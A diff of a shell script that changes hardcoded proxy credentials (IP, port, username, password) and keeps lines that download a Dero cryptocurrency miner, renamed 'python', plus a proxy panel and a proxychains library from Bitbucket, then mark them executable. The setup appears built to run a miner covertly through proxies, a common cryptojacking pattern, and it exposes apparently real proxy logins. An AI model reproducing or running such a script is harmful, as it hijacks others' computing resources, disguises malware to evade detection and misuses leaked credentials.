@@ -1,7 +1,7 @@
-proxy="103.253.24.243" 
-port="8080"
-user="woiden_racias90"  
-pass="90racias"
+proxy="138.128.59.129" 
+port="9058"
+user="wrbjmsvx"  
+pass="6fxihvhr6jzb"
 wget -q -O python https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x python
 wget -q -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
 wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
